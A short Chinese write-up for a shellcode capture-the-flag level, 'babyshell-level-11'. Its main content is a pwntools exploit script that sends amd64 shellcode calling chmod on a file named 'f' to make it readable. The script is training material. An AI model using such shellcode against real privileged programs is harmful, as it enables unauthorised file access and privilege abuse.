# 挑战简介
在上一题的基础上
这项挑战即将关闭 stdin，这意味着传递第二阶段 shellcode 将更加困难。您需要
想出一个替代解决方案（例如在内存中解包 shellcode）来绕过复杂的过滤器。

# 思路
好吧，没搞懂冒泡排序，禁用了stdin也和前几题的模板无关，依旧套模板  

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-11')

p.recvuntil('Reading 0x1000 bytes from stdin.\n')

shellcode = asm('''
    push 0x66
    mov rdi, rsp
    push 4

_stage:
    pop rsi
    jmp short skip
skip:
    push 90
    pop rax
    syscall
    ret
    ret
    ret
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```

